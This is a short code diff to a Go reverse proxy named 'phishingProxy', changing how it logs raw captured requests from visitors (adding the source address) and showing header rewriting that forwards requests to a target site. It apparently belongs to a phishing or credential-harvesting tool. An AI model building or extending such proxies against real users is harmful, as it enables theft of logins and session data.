@@ -68,7 +68,9 @@ func (p *phishingProxy) Director(request *http.Request) {
 
 	if strEqList(request.URL.RequestURI(), p.Reverse.DumpURL) {
 		req, _ := httputil.DumpRequest(request, true)
-		fmt.Printf("\n-------------------- %s start---------------------------\n\n\n", request.URL.RequestURI())
+		fmt.Printf("\n-------------------- %s start  -------------------------\n", request.URL.RequestURI())
+		fmt.Printf("----- requests from: %s\n", request.RemoteAddr)
+		fmt.Printf("----- requests raw: \n\n -----")
 		fmt.Println(string(req))
 		fmt.Printf("\n\n-------------------- %s end  ---------------------------\n\n", request.URL.RequestURI())
 
@@ -86,11 +88,9 @@ func (p *phishingProxy) Director(request *http.Request) {
 		origin = strings.Replace(origin, request.Host, p.TargetURL.Host, 1)
 		request.Header.Set("Origin", origin)
 	}
-
 	request.URL.Scheme = p.TargetURL.Scheme
 	request.URL.Host = p.TargetURL.Host
 	request.Host = p.TargetURL.Host
-
 	if _, ok := request.Header["User-Agent"]; !ok {
 		// explicitly disable User-Agent so it's not set to default value
 		request.Header.Set("User-Agent", "")
